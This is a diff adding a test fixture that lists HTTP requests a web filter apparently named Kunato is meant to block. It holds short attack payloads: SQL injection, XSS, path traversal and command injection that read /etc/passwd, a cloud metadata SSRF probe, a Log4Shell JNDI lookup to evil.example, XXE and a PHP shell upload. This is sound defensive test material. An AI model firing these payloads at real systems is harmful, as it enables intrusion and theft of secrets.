@@ -1,0 +1,28 @@
+# Requests that Kunato must stop before they reach the upstream.
+#
+# One request per line:
+#   METHOD TARGET [key=value ...]
+#   - `ua`   sets the User-Agent header
+#   - `body` sets the request body
+#   - any other key becomes a request header
+#   - values with spaces or quotes are quoted with "..."; use \" for a literal
+#     quote and \\ for a backslash inside a quoted value
+# Blank lines and lines starting with `#` are ignored.
+#
+# These requests exercise the rules in rules.example.yaml. Run Kunato with a
+# configuration that does not list this client in `trusted-sources`.
+
+GET /?q=union%20select
+GET /?id=1%20or%201=1
+POST /comment body=<script>alert(1)</script>
+GET /?x=%3Csvg/onload=alert(1)%3E
+GET /?file=../../etc/passwd
+GET /..%2f..%2fetc/passwd
+GET /.env
+GET /backup.sql
+GET /?cmd=;cat%20/etc/passwd
+GET /?url=http://169.254.169.254/latest/meta-data/
+GET /?x=${jndi:ldap://evil.example/x}
+GET / ua=sqlmap/1.0
+POST /xml body="<!DOCTYPE foo [<!ENTITY xxe SYSTEM x>]>"
+POST /upload body="filename=\"shell.php\""
